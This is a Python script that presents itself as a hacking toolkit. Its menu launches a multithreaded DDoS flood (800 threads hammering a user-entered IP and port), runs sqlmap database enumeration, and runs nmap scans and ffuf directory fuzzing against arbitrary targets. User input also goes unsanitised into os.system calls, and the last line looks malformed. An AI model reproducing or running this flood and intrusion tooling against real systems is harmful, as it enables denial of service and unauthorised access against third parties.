import os, socket, threading, time, sys

# Professional UI Colors
R = '\033[1;31m'; G = '\033[1;32m'; Y = '\033[1;33m'
C = '\033[1;36m'; W = '\033[0m'

def banner():
    os.system('clear')
    print(f"{C}    ██████╗ ██╗  ██╗██╗   ██╗    ██╗   ██╗██████╗ ")
    print(f"    ██╔══██╗██║  ██║╚██╗ ██╔╝    ██║   ██║╚════██╗")
    print(f"    ██████╔╝███████║ ╚████╔╝     ██║   ██║ █████╔╝")
    print(f"    ██╔══██╗██╔══██║  ╚██╔╝      ╚██╗ ██╔╝██╔═══╝ ")
    print(f"    ██████╔╝██║  ██║   ██║        ╚████╔╝ ███████╗")
    print(f"{Y}    ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(f"{G}    ▶ DEVELOPER : tranminhvang (Minh Vang)")
    print(f"{G}    ▶ PROJECT   : BHY-Toolkit Ultimate Gold Edition")
    print(f"{G}    ▶ STATUS    : {R}OFFICIAL RELEASE {G}| VERSION : 2.0")
    print(f"{Y}    ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{W}")

def ddos_engine():
    target = input(f"{C}➜ Enter Target IP: {W}")
    port = int(input(f"{C}➜ Enter Port: {W}"))
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(f"GET /{target} HTTP/1.1\r\n".encode(), (target, port))
                s.close()
            except: pass
    print(f"{R}[🔥] Launching Cyber-Attack with 800 threads...{W}")
    for _ in range(800): threading.Thread(target=attack, daemon=True).start()
    input(f"{Y}[!] Press Enter to Terminate...{W}")

while True:
    banner()
    print(f"  {R}[01]{W} Network Recon      {R}[02]{W} SQL Vulnerability")
    print(f"  {R}[03]{W} DDoS Stress Test   {R}[04]{W} Domain WHOIS")
    print(f"  {R}[05]{W} Directory Fuzzer   {R}[06]{W} Full System Audit")
    print(f"  {Y}───────────────────────────────────────────")
    print(f"  {R}[00]{W} Exit Secure Session")
    
    cmd = input(f"\n{C}minhvang@bhy_toolkit:~# {W}")
    if cmd == '01': os.system(f"nmap -v {input('Target IP: ')}")
    elif cmd == '02': os.system(f"sqlmap -u {input('Target URL: ')} --batch --dbs")
    elif cmd == '03': ddos_engine()
    elif cmd == '04': os.system(f"whois {input('Domain: ')}")
    elif cmd == '05': os.system(f"ffuf -u {input('URL: ')}/FUZZ -w common.txt")
    elif cmd == '06': os.system(f"nmap -A -T4 {input('Target IP: ')}")
    elif cmd == '00': break
    input(f"\n{G}➜ Press Enter to return...{
                                  W}")
